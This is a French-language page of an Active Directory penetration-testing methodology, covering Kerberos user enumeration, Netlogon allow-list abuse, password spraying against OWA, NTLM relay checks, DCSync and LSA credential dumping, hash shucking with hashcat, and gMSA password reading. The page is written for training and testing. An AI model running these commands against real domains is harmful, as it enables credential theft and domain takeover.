# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

**Active Directory** est une technologie fondamentale qui permet aux **administrateurs réseau** de créer et de gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d’un réseau. Conçu pour évoluer, il facilite l’organisation d’un grand nombre d’utilisateurs en **groupes** et **sous-groupes** faciles à gérer, tout en contrôlant les **droits d’accès** à différents niveaux.

La structure d’**Active Directory** se compose de trois couches principales : les **domaines**, les **arbres** et les **forêts**. Un **domaine** regroupe des objets, tels que des **utilisateurs** ou des **appareils**, qui partagent une base de données commune. Les **arbres** sont des groupes de domaines liés par une structure commune, et une **forêt** regroupe plusieurs arbres interconnectés par des **relations d’approbation**, formant ainsi la couche supérieure de la structure organisationnelle. Des **droits d’accès** et de **communication** spécifiques peuvent être attribués à chacun de ces niveaux.

Les concepts clés d’**Active Directory** sont les suivants :

1. **Répertoire** – Contient toutes les informations relatives aux objets Active Directory.
2. **Objet** – Désigne les entités présentes dans le répertoire, notamment les **utilisateurs**, les **groupes** ou les **dossiers partagés**.
3. **Domaine** – Sert de conteneur pour les objets du répertoire. Plusieurs domaines peuvent coexister dans une **forêt**, chacun conservant sa propre collection d’objets.
4. **Arbre** – Regroupement de domaines partageant un domaine racine commun.
5. **Forêt** – Niveau supérieur de la structure organisationnelle d’Active Directory, composé de plusieurs arbres liés par des **relations d’approbation**.

**Active Directory Domain Services (AD DS)** regroupe divers services essentiels à la gestion centralisée et à la communication au sein d’un réseau. Ces services comprennent :

1. **Services de domaine** – Centralisent le stockage des données et gèrent les interactions entre les **utilisateurs** et les **domaines**, notamment les fonctionnalités d’**authentification** et de **recherche**.
2. **Services de certificats** – Supervisent la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Services d’annuaire léger** – Prennent en charge les applications utilisant un annuaire via le **protocole LDAP**.
4. **Services de fédération d’annuaires** – Fournissent des fonctionnalités d’**authentification unique** pour authentifier les utilisateurs sur plusieurs applications Web au cours d’une même session.
5. **Gestion des droits** – Contribue à protéger les œuvres protégées par le droit d’auteur en empêchant leur distribution et leur utilisation non autorisées.
6. **Service DNS** – Essentiel à la résolution des **noms de domaine**.

Pour une explication plus détaillée, consultez : [**TechTerms - Définition d’Active Directory**](https://techterms.com/definition/active_directory)

### **Authentification Kerberos**

Pour **attaquer un AD**, vous devez bien **comprendre** le **processus d’authentification Kerberos**.\
[**Consultez cette page si vous ne savez pas encore comment il fonctionne.**](kerberos-authentication.md)

## Aide-mémoire

Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour voir rapidement quelles commandes exécuter afin d’énumérer ou d’exploiter un AD.

> [!WARNING]
> La communication Kerberos **requiert généralement un nom de domaine complet (FQDN)** pour que le client puisse obtenir un ticket pour le SPN correct. L’accès à une machine par son adresse IP utilise souvent NTLM au lieu de Kerberos.

## Reconnaissance d’Active Directory (sans identifiants/sessions)

Si vous avez accès à un environnement AD, mais que vous ne disposez d’aucun identifiant ni d’aucune session, vous pouvez :

- **Pentester le réseau :**
  - Analyser le réseau, repérer les machines et les ports ouverts, puis tenter d’**exploiter les vulnérabilités** ou d’**extraire des identifiants** (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
  - L’énumération DNS peut révéler des informations sur les serveurs clés du domaine, comme les serveurs Web, les imprimantes, les partages, le VPN, les serveurs multimédias, etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consultez la [**méthodologie de Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour en savoir plus sur la marche à suivre.
- **Vérifier l’accès null et Guest aux services SMB** (cela ne fonctionnera pas sur les versions modernes de Windows) :
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Vous trouverez ici un guide plus détaillé sur l’énumération d’un serveur SMB :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Énumérer LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Vous trouverez ici un guide plus détaillé sur l’énumération de LDAP (prêtez une **attention particulière à l’accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Empoisonner le réseau**
  - Récupérer des identifiants en [**usurpant des services avec Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Accéder à un hôte en [**abusant de l’attaque relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Récupérer des identifiants en **exposant** de [**faux services UPnP avec evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
  - Extraire des noms d’utilisateur et des noms à partir de documents internes, des réseaux sociaux, des services (principalement Web) au sein des environnements de domaine, ainsi que des informations accessibles publiquement.
  - Si vous trouvez les noms complets des employés de l’entreprise, vous pouvez essayer différentes **conventions de nom d’utilisateur** AD (**[lire ceci](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque nom), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
  - Outils :
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Énumération des utilisateurs

- **Énumération SMB/LDAP anonyme :** consultez les pages [**Pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**Pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Énumération avec Kerbrute** : lorsqu’un **nom d’utilisateur invalide est demandé**, le serveur répond avec le code d’erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le nom d’utilisateur est invalide. Pour les **noms d’utilisateur valides**, la réponse contiendra soit le **TGT dans une réponse AS-REP**, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, qui indique que l’utilisateur doit effectuer une pré-authentification.
- **Aucune authentification auprès de MS-NRPC** : utiliser auth-level = 1 (sans authentification) auprès de l’interface MS-NRPC (Netlogon) des contrôleurs de domaine. Après s’être lié à l’interface MS-NRPC, cette méthode appelle la fonction `DsrGetDcNameEx2` pour vérifier si l’utilisateur ou l’ordinateur existe, sans aucun identifiant. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’énumération. L’étude est disponible [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Serveur OWA (Outlook Web Access)**

Si vous avez trouvé l’un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs** sur celui-ci. Par exemple, vous pouvez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper) :

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateur dans [**ce dépôt GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez déjà connaître les noms des personnes travaillant dans l'entreprise grâce à l'étape de recon que vous auriez dû effectuer auparavant. Avec leurs noms et prénoms, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiellement valides.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Même après l'application du correctif **Zerologon** sur le DC, les comptes explicitement inscrits sur la liste d'autorisation peuvent rester exposés au comportement historique/vulnérable du canal sécurisé Netlogon. La configuration risquée est la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou la valeur de registre correspondante **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Cette valeur est un **descripteur de sécurité SDDL** (voir [Security Descriptors](security-descriptors.md)). Tout compte ou groupe auquel l'ACE concernée est accordée dans la DACL peut être ciblé. Par exemple, `O:BAG:BAD:(A;;RC;;;WD)` inscrit de fait **Everyone** sur la liste d'autorisation.

Procédure pratique pour l'opérateur :

1. **Identifier les principaux inscrits sur la liste d'autorisation** en vérifiant à la fois **SYSVOL/GPO** et le **registre du DC actif**.
2. **Résoudre les SID** trouvés dans le SDDL pour identifier les utilisateurs/ordinateurs AD correspondants et donner la priorité aux **comptes machine des DC**, aux **comptes d'approbation** et aux autres machines privilégiées.
3. Répéter les tentatives d'**authentification MS-NRPC / Netlogon** avec le compte inscrit sur la liste d'autorisation.
4. Après avoir deviné le mot de passe, abuser de la **fonctionnalité de définition du mot de passe Netlogon** pour réinitialiser le mot de passe du compte cible (le PoC public le définit sur une chaîne vide).<sup>[[9]](#references)[[10]](#references)</sup>

Exemples rapides de triage / de lab tirés de l'artefact public :

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes :

- Le **scanner** est utile, car l’allow-list effective peut se trouver dans **SYSVOL**, dans le **registre**, ou dans les deux.
- Le chemin d’exploitation lui-même est important, car il **ne nécessite pas de privilèges Domain Admin** une fois qu’un compte vulnérable a été identifié.
- La compromission d’un **compte machine de Domain Controller**, tel que `DC$`, est particulièrement dangereuse, car la réinitialisation de son mot de passe peut directement ouvrir des voies plus larges de **prise de contrôle de l’AD**.
- La faisabilité du **brute force** dépend du mode : l’artefact public décrit une approche meet-in-the-middle, un **brute force de 24 bits** lorsqu’un autre compte machine est disponible, ainsi que des variantes plus lentes de **32 bits**.

Notes de détection et de renforcement :

- Auditez la policy d’allow-list et supprimez tout élément, à l’exception des exceptions de compatibilité temporaires et explicitement requises.
- Surveillez les événements **5827/5828/5829/5830/5831** du journal **System** des DC afin de détecter les connexions Netlogon vulnérables refusées, découvertes ou explicitement autorisées par la policy.
- Considérez les comptes de `VulnerableChannelAllowList` comme **à haut risque** tant que la dépendance à l’ancien système n’a pas été supprimée.

### Connaître un ou plusieurs noms d’utilisateur

Bon, vous savez donc que vous avez déjà un nom d’utilisateur valide, mais aucun mot de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : si un utilisateur **n’a pas** l’attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur, qui contiendra des données chiffrées à l’aide d’une dérivation de son mot de passe.
- [**Password Spraying**](password-spraying.md) : essayons les mots de passe les plus **courants** avec chacun des utilisateurs identifiés. Peut-être qu’un utilisateur emploie un mauvais mot de passe (gardez à l’esprit la policy de mots de passe !).
  - Notez que vous pouvez également faire du **spraying** sur des serveurs OWA pour tenter d’accéder aux serveurs de messagerie des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### Empoisonnement LLMNR/NBT-NS

Vous pourriez **obtenir** des **hashes** de challenge en faisant du **poisoning** de certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Relais NTLM

L’énumération d’Active Directory fournit des noms d’utilisateur, des identifiants d’e-mail et des conventions de nommage, des hôtes candidats ainsi que des services susceptibles d’être contraints à s’authentifier. Utilisez ces informations pour identifier les [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM viables et les chemins potentiels vers l’environnement AD.

### Reconnaissance avec les workspaces NetExec et vérifications de posture de relay

- Utilisez les **workspaces `nxcdb`** pour conserver l’état de la reconnaissance AD par engagement : `workspace create <name>` crée des bases de données SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et affichez les secrets collectés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La découverte rapide d’un sous-réseau avec **`netexec smb <cidr>`** révèle le **domaine**, la **version du système d’exploitation**, les **exigences de signature SMB** et l’**authentification Null**. Les machines membres affichant `(signing:False)` sont **vulnérables au relay**, tandis que les DC exigent souvent la signature.
- Générez des **noms d’hôtes dans /etc/hosts** directement à partir de la sortie de NetExec pour faciliter le ciblage :

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Lorsque le **SMB relay vers le DC est bloqué** par la signature, vérifiez tout de même la configuration **LDAP** : `netexec ldap <dc>` signale `(signing:None)` / un channel binding faible. Un DC qui exige la signature SMB mais dont la signature LDAP est désactivée reste une cible viable pour le **relay-to-LDAP**, notamment pour des abus comme le **SPN-less RBCD**.

### Fuites d’identifiants côté client via les imprimantes → validation en masse des identifiants du domaine

- Les interfaces web d’imprimantes intègrent parfois des mots de passe admin masqués dans le HTML. L’inspection du code source ou des outils de développement peut révéler le texte en clair (par ex. `<input value="<password>">`), permettant un accès Basic-auth aux référentiels de scan et d’impression.
- Les travaux d’impression récupérés peuvent contenir des documents d’intégration en texte brut avec des mots de passe propres à chaque utilisateur. Conservez les correspondances lors des tests :<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Voler des identifiants NTLM

Si vous pouvez **accéder à d’autres PC ou partages** avec l’**utilisateur null ou guest**, vous pouvez **placer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés, **déclen**cheront une authentification NTLM contre vous, afin que vous puissiez **voler** le **challenge NTLM** pour le casser :

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash shucking et attaques NT-Candidate

Le **hash shucking** consiste à utiliser chaque hash NT que vous possédez déjà comme mot de passe candidat pour d’autres formats, plus lents, dont le matériel de clé est directement dérivé du hash NT. Au lieu de brute-forcer de longues phrases secrètes dans des tickets Kerberos RC4, des challenges NetNTLM ou des identifiants mis en cache, vous fournissez les hash NT aux modes NT-candidate de Hashcat, qui vérifie la réutilisation des mots de passe sans jamais révéler le texte en clair. Cette méthode est particulièrement efficace après la compromission d’un domaine, lorsque vous pouvez récupérer des milliers de hash NT actuels et historiques.<sup>[[5]](#references)</sup>

Utilisez le shucking lorsque :

- Vous disposez d’un corpus NT issu de DCSync, de dumps SAM/SECURITY ou de coffres d’identifiants et devez vérifier la réutilisation dans d’autres domaines/forêts.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM ou des blobs DCC/DCC2.
- Vous voulez rapidement prouver la réutilisation de longues phrases secrètes impossibles à casser et pivoter immédiatement avec Pass-the-Hash.

Cette technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le hash NT (par exemple, Kerberos etype 17/18 AES). Si un domaine impose uniquement AES, vous devez revenir aux modes de mot de passe classiques.

#### Constituer un corpus de hash NT

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l’historique pour récupérer le plus grand ensemble possible de hash NT (et leurs valeurs précédentes) :

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Les entrées d’historique élargissent considérablement le pool de candidats, car Microsoft peut stocker jusqu’à 24 anciens hashes par compte. Pour découvrir d’autres façons de récolter des secrets NTDS, voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps du cache des endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les identifiants de domaine mis en cache (DCC/DCC2). Supprimez les doublons et ajoutez ces hashes à la même liste `nt_candidates.txt`.
- **Suivi des métadonnées** – Conservez le nom d’utilisateur et le domaine associés à chaque hash (même si la wordlist ne contient que des valeurs hexadécimales). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe dès que Hashcat affiche le candidat gagnant.
- Privilégiez les candidats provenant de la même forêt ou d’une forêt de confiance ; cela maximise les chances de correspondance lors du shucking.

#### Modes NT-candidate de Hashcat

| Type de hash                             | Mode mot de passe | Mode NT-candidate |
| ---------------------------------------- | ----------------- | ----------------- |
| Identifiants de domaine mis en cache (DCC) | 1100              | 31500             |
| Identifiants de domaine mis en cache 2 (DCC2) | 2100              | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500              | 27000             |
| NetNTLMv2                                | 5600              | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500              | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100             | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200             | 35400             |

Remarques :

- Les entrées NT-candidate **doivent rester des hashes NT bruts de 32 caractères hexadécimaux**. Désactivez les moteurs de règles (pas de `-r`, pas de modes hybrides), car les transformations corrompent le matériau de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l’espace de recherche NTLM (~30 000 MH/s sur un M3 Max) est environ 100 fois plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT soigneusement sélectionnée coûte bien moins cher que d’explorer tout l’espace des mots de passe dans le format le plus lent.
- Utilisez toujours la **dernière version de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), car les modes 31500/31600/35300/35400 ont été publiés récemment.<sup>[[7]](#references)</sup>
- Il n’existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair, car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, et non de hashes NT bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faibles privilèges (voir la page Kerberoast pour plus de détails) :

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck le ticket avec votre liste NT :

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat dérive la clé RC4 de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l’un de vos hash NT existants.

3. Basculez immédiatement vers PtH :

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Identifiants mis en cache (mode 31600)

1. Extraire les ouvertures de session mises en cache depuis un poste de travail compromis :

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copiez la ligne DCC2 de l’utilisateur intéressant du domaine dans `dcc2_highpriv.txt` et shuckez-la :

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Une correspondance réussie révèle le hash NT déjà présent dans votre liste, ce qui prouve que l’utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou faites du brute-force en mode NTLM rapide pour retrouver le mot de passe en clair.

Le même workflow s’applique aux réponses aux défis NetNTLM (`-m 27000/27100`) et à DCC (`-m 31500`). Une fois une correspondance identifiée, vous pouvez lancer un relay, utiliser PtH via SMB/WMI/WinRM ou recraquer le hash NT hors ligne avec des masques/règles.



## Énumérer Active Directory AVEC des identifiants/une session

Pour cette phase, vous devez avoir **compromis les identifiants ou une session d’un compte de domaine valide.** Si vous avez des identifiants valides ou un shell en tant qu’utilisateur du domaine, **n’oubliez pas que les options présentées précédemment restent des moyens de compromettre d’autres utilisateurs**.

Avant de commencer l’énumération authentifiée, comprenez le **problème du double saut Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

Compromettre un compte est une **étape majeure dans l’évaluation du domaine**, car cela permet l’**énumération d’Active Directory** authentifiée :

Concernant [**ASREPRoast**](asreproast.md), vous pouvez maintenant trouver tous les utilisateurs potentiellement vulnérables. Concernant le [**Password Spraying**](password-spraying.md), vous pouvez obtenir une **liste de tous les noms d’utilisateur** et essayer le mot de passe du compte compromis, les mots de passe vides et les nouveaux mots de passe prometteurs.

- Vous pouvez utiliser [**CMD pour effectuer une reconnaissance de base**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez également utiliser [**powershell pour la reconnaissance**](../basic-powershell-for-pentesters/index.html), qui sera plus furtif
- Vous pouvez aussi [**utiliser powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil remarquable pour la reconnaissance dans un Active Directory est [**BloodHound**](bloodhound.md). Il est **peu furtif** (selon les méthodes de collecte utilisées), mais **si cela ne vous préoccupe pas**, essayez-le absolument. Repérez où les utilisateurs peuvent se connecter par RDP, trouvez des chemins vers d’autres groupes, etc.
  - **Autres outils automatisés d’énumération AD :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Consultez les [**enregistrements DNS de l’AD**](ad-dns-records.md), car ils peuvent contenir des informations intéressantes.
- **AdExplorer.exe**, fourni avec la suite **SysInternal**, est un **outil avec interface graphique** qui permet d’énumérer l’annuaire.
- Vous pouvez aussi rechercher des identifiants dans la base LDAP à l’aide de **ldapsearch**, dans les champs _userPassword_ et _unixUserPassword_, voire dans les notes _description_ et _info_ des utilisateurs. Un jeton non étiqueté ressemblant à un mot de passe dans _info_ n’est qu’un candidat : vérifiez séparément son rôle et sa validité, et n’incluez pas le contenu des notes dans les résultats d’énumération courants. Consultez [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d’autres méthodes.
- Examinez les scripts de connexion au domaine et de mappage des lecteurs **auxquels vous avez accès** dans `\\<dc>\NETLOGON` ou `\\<dc>\SYSVOL\<domain>\scripts`, si votre autorisation le permet. [Microsoft documente](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) le rôle du répertoire de scripts du partage NETLOGON. Commencez par lister les noms, puis inspectez uniquement les scripts pertinents et lisibles, en limitant leur taille ; ne déversez pas l’intégralité du partage et n’affichez pas les valeurs des identifiants lors d’une énumération courante. Un appel PowerShell à [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **ne protège pas** un mot de passe en clair stocké dans le script. La présence de cet appel ne prouve pas à elle seule qu’un secret est codé en dur : remontez à son entrée effective, puis vérifiez séparément le compte, la validité des identifiants et les privilèges. L’examen d’un script de domaine sur un partage distant est distinct de l’énumération de l’hôte local.
- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine avec [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez également essayer des outils automatisés comme :
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraire tous les utilisateurs du domaine**

  Il est très facile d’obtenir tous les noms d’utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section sur l’énumération semble courte, c’est la partie la plus importante de toutes. Consultez les liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu’à être à l’aise. Lors d’une évaluation, c’est le moment décisif pour trouver comment obtenir les privilèges DA ou déterminer que rien ne peut être fait.

### Comptes d’ordinateur précréés prévisibles -> accès au mot de passe gMSA

Les comptes d’ordinateur créés à l’avance pour les intégrations héritées peuvent conserver un mot de passe initial prévisible. Le module `pre2k` de NetExec repère la valeur caractéristique `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) et tente d’obtenir un TGT Kerberos avec les 14 premiers caractères du nom d’ordinateur en minuscules, sans le `$` final. Considérez cette valeur UAC comme un critère de sélection de candidats ; ne supposez pas que l’appartenance au groupe **Pre-Windows 2000 Compatible Access** suffit à prouver que le mot de passe est faible.<sup>[[18]](#references)[[20]](#references)</sup>

Utilisez l’énumération LDAP authentifiée pour tester les candidats et enregistrer les TGT obtenus. `ALL=True` étend les tests aux objets qui ne correspondent pas au filtre par défaut `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Un bind par défaut/NTLM qui échoue **n’invalide pas** cette découverte : testez avec `-k`, un FQDN qui se résout vers le DC et une horloge synchronisée avec le KDC. Les exécutions réussies du module écrivent les listes de candidats et les ccaches acquis sous `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Après avoir compromis le principal ordinateur, analysez ses appartenances à des groupes imbriqués et ses droits sortants. En particulier, les principaux nommés dans le descripteur de sécurité `msDS-GroupMSAMembership` d’un gMSA peuvent lire `msDS-ManagedPassword` ; la sortie `--gmsa` de NetExec affiche les principaux autorisés et renvoie le hachage NT actuel lorsque l’ordinateur utilisé pour l’authentification est autorisé.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Évaluez ensuite le gMSA récupéré comme n’importe quel autre identifiant : inspectez les appartenances aux groupes locaux et de domaine, les droits d’ouverture de session, les SPN, la délégation et les services accessibles avant de tenter le pass-the-hash. Cette méthode de récupération fondée sur les ACL est distincte de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), qui permet de dériver les mots de passe gérés après la compromission de la clé racine KDS.<sup>[[20]](#references)</sup>

Un principal ordinateur peut également exercer un contrôle sortant sur d’autres objets ordinateur ou groupes. Après en avoir obtenu un, inspectez séparément ses appartenances imbriquées et ses ACL effectives : un droit d’écriture sur un autre objet ordinateur peut permettre de modifier un compte, et des droits d’appartenance à un groupe peuvent mener à un rôle autorisant l’ouverture de session. Un indicateur de compte intermédiaire, une convention de nommage prévisible ou une relation `GenericWrite` ne suffisent pas, à eux seuls, à prouver que le chemin complet est exploitable.

Une copie lisible d’un blob `msDS-ManagedPassword` dans un fichier, un partage ou une sauvegarde constitue une voie d’exposition distincte : l’ACL de lecture LDAP ne protège pas une copie stockée ailleurs. Vérifiez qu’il s’agit bien d’un blob de mot de passe géré avant de l’interpréter, et distinguez cette situation d’une lecture LDAP autorisée et de la dérivation à partir de la clé racine KDS.

### Kerberoast

Le Kerberoasting consiste à obtenir les **tickets TGS** utilisés par des services associés à des comptes utilisateur, puis à en casser le chiffrement — basé sur les mots de passe utilisateur — **hors ligne**.

Pour en savoir plus :

{{#ref}}
kerberoast.md
{{#endref}}

### Connexion à distance (RDP, SSH, FTP, Win-RM, etc.)

